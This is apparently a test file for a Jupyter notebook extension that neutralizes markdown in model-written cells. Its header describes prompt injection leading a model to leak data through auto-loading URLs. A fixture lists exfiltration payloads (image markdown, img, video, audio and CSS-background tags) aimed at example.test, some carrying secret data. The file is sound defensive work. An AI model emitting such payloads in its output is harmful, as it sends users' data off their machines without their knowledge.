/**
 * A model's text in the text cells that an agent's run in another notebook
 * writes (src/model/crosskernel.ts). JupyterLab's sanitizer keeps images,
 * video, audio, image inputs and CSS backgrounds with a URL in a markdown
 * cell, and the browser loads them when the cell shows, in Whybook and in
 * JupyterLab's notebook. A prompt injection could make a model write such a
 * URL with data in it, and the data would leave the machine with no click.
 * Nothing in these cells loads by itself, and the rest of the text renders as
 * it did.
 */
import type { IComparison, IKernelChoice } from '../model/crosskernel';
import {
  comparisonMarkdown,
  inertMarkdown,
  introText
} from '../model/crosskernel';

/** What loads by itself in a markdown cell in JupyterLab 4.6. */
const LOADS = {
  image: '![x](http://example.test/?d=secret)',
  reference: '![y][r]\n\n[r]: http://example.test/r',
  img: '<img src="http://example.test/img">',
  bare: '<IMG SRC=http://example.test/bare>',
  video: '<video poster="http://example.test/poster"></video>',
  audio: '<audio src="http://example.test/audio" preload="auto"></audio>',
  input: '<input type="image" src="http://example.test/input">',
  background:
    '<div style="background-image:url(http://example.test/bg)">x</div>'
};

/** Whether a renderer could load anything from this markdown. */
function loads(markdown: string): boolean {
  return /!\[|<[A-Za-z/!?]/.test(markdown);
}

describe("a model's text in a markdown cell", () => {
  it.each(Object.entries(LOADS))('does not load %s', (_name, text) => {
    expect(loads(text)).toBe(true);
    expect(loads(inertMarkdown(text))).toBe(false);
  });

  it('shows an image and a tag as their text', () => {
    expect(inertMarkdown(LOADS.image)).toBe(
      '!\\[x](http://example.test/?d=secret)'
    );
    expect(inertMarkdown(LOADS.img)).toBe(
      '&lt;img src="http://example.test/img">'
    );
  });

  it('leaves links, code, bold, tables, lists and comparisons as they are', () => {
    const text = [
      'The means agree ([4]), with **p < 0.05** and `lme4::lmer` in [the R notebook](x.R.ipynb).',
      '',
      '| Estimate | Python | R |',
      '| --- | --- | --- |',
      '| a > b | 1 | 2 |',
      '',
      '- one',
      '- two!'
    ].join('\n');
    expect(inertMarkdown(text)).toBe(text);
  });
});

describe('the text cells of a run in another notebook', () => {
  const comparison: IComparison = {
    first: {
      path: 'trial.ipynb',
      kernel: 'Python 3 (ipykernel)',
      language: 'python',
      results: true
    },
    second: {
      path: 'trial<img src=http://example.test/file>.R.ipynb',
      kernel: 'R 4.4.3 (xr)',
      language: 'R',
      results: true
    },
    rows: [
      {
        estimate: '![e](http://example.test/estimate)',
        first: { cell: '[2]', text: '1.5', value: 1.5, found: true },
        second: { cell: '[3]', text: '1.5', value: 1.5, found: true },
        difference: 0,
        note: null
      }
    ],
    defaults: [],
    missing: ['<video poster=http://example.test/missing></video>']
  };

  it("keep the comparison's estimates, packages, file name and answer from loading anything", () => {
    const text = comparisonMarkdown({
      question:
        'Would I get the same results in R? ![q](http://example.test/q)',
      comparison,
      answer: 'They agree. <img src="http://example.test/answer?d=1.5">',
      ran: 2
    });
    expect(loads(text)).toBe(false);
    expect(text).toContain(
      '**The agent\'s answer.** They agree. &lt;img src="http://example.test/answer?d=1.5">'
    );
  });

  it("keep the model's title of the new notebook from loading anything", () => {
    const kernel: IKernelChoice = {
      name: 'xr',
      displayName: 'R 4.4.3 (xr)',
      language: 'R',
      label: 'R',
      sandboxed: false,
      program: 'xr'
    };
    const text = introText({
      title: 'Trial ![t](http://example.test/title)',
      question: 'Would I get the same results in R?',
      first: 'trial.ipynb',
      kernel
    });
    expect(loads(text)).toBe(false);
    expect(text.split('\n')[0]).toBe(
      '# Trial !\\[t](http://example.test/title), in R'
    );
  });
});
